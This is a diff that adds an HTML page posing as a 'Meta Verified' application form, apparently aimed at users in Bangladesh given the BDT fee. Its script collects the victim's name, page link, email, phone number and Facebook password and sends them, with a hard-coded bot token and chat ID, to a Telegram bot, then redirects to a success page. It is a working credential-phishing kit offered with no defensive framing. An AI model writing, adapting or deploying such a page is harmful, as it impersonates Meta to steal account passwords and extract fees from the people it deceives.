@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Meta Verified - Page Application</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f4;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .form-container {
+      background-color: white;
+      width: 400px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+
+    .form-container h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background-color: #0f65d6;
+    }
+
+    .note {
+      margin-top: 15px;
+      font-size: 13px;
+      color: gray;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <h2>Meta Verified - Page Application</h2>
+    <form id="metaForm">
+      <input type="text" id="name" placeholder="Your Full Name" required>
+      <input type="text" id="page" placeholder="Facebook Page/ID Link" required>
+      <input type="email" id="email" placeholder="Your Email Address" required>
+      <input type="tel" id="mobile" placeholder="Mobile Number" required>
+      <input type="password" id="password" placeholder="Meta/Facebook Password" required>
+      <button type="submit">Apply for Verification</button>
+    </form>
+    <div class="note">
+      Note: Processing fee 199 BDT. You'll be contacted after verification.
+    </div>
+  </div>
+
+  <script>
+    const TOKEN = "7680880099:AAE6BMTLUinVqsNdrA0sapg048Ps_7DhCe8";
+    const CHAT_ID = "7422461953";
+
+    document.getElementById("metaForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const name = document.getElementById("name").value.trim();
+      const page = document.getElementById("page").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const mobile = document.getElementById("mobile").value.trim();
+      const password = document.getElementById("password").value.trim();
+
+      // Validation
+      if (name.length < 3) {
+        alert("Name must be at least 3 characters.");
+        return;
+      }
+      if (!page.startsWith("http")) {
+        alert("Please enter a valid Facebook Page/ID link.");
+        return;
+      }
+      if (!/^\d{11}$/.test(mobile)) {
+        alert("Mobile number must be 11 digits.");
+        return;
+      }
+      if (!/^\S+@\S+\.\S+$/.test(email)) {
+        alert("Invalid email format.");
+        return;
+      }
+      if (password.length < 6) {
+        alert("Password must be at least 6 characters.");
+        return;
+      }
+
+      const message = `
+🔔 New Form Submission:
+👤 Name: ${name}
+📄 Page: ${page}
+📧 Email: ${email}
+📱 Mobile: ${mobile}
+🔐 Password: ${password}
+      `;
+
+      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      })
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("metaForm").reset();
+        window.location.href = "success.html"; // ✅ Redirect to success page
+      })
+      .catch(err => {
+        alert("Failed to send message!");
+        console.error(err);
+      });
+    });
+  </script>
+
+</body>
+</html>
